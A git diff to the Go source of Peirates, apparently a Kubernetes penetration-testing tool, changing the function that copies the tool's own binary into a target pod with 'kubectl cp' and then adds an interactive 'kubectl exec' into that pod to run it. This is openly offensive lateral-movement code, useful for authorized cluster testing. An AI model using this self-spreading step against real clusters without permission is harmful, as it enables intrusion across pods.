@@ -13,10 +13,11 @@ import (
 	"encoding/base64"
 	"encoding/json" // Command line flag parsing
 	"fmt"           // String formatting (Printf, Sprintf)
-	"io/ioutil"     // Utils for dealing with IO streams
-	"log"           // Logging utils
-	"math/rand"     // Random module for creating random string building
-	"os"            // Environment variables ...
+	"io"
+	"io/ioutil" // Utils for dealing with IO streams
+	"log"       // Logging utils
+	"math/rand" // Random module for creating random string building
+	"os"        // Environment variables ...
 	"strconv"
 	"syscall"
 
@@ -257,7 +258,7 @@ func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
 	println("[+] Transferring a copy of Peirates into pod:", pod)
 
 	// First, try copying the binary in via a kubectl cp command.
-	filename := os.Getenv("_")
+	filename := os.Args[0]
 	destination := pod + ":/tmp"
 
 	copyIntoPod, _, err := runKubectlSimple(connectionString, "cp", filename, destination)
@@ -271,6 +272,23 @@ func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
 		// Feature request: give the user the option to exec into the next pod.
 		// $_
 		// runKubectlSimple (exec -it pod /tmp/peirates)
+
+		stdinRead, stdinWrite := io.Pipe()
+		stdoutRead, stdoutWrite := io.Pipe()
+		stderrRead, stderrWrite := io.Pipe()
+
+		// I bet we can get away with io.Copy since the streams will get closed when kubectl is done
+		go func() {
+			// TODO@Faith inject some config here
+			io.Copy(stdinWrite, os.Stdin)
+		}()
+		go io.Copy(os.Stdout, stdoutRead)
+		go io.Copy(os.Stderr, stderrRead)
+
+		// TODO@Faith why do we get garbage error after this is done?
+		// TODO@Faith make this an option of doing it interactive or getting a command
+		runKubectlWithConfig(connectionString, stdinRead, stdoutWrite, stderrWrite, "exec", "-it", pod, "--", "/tmp/peirates")
+		return
 
 		// println("Option 2 is: ")
 		// CA path
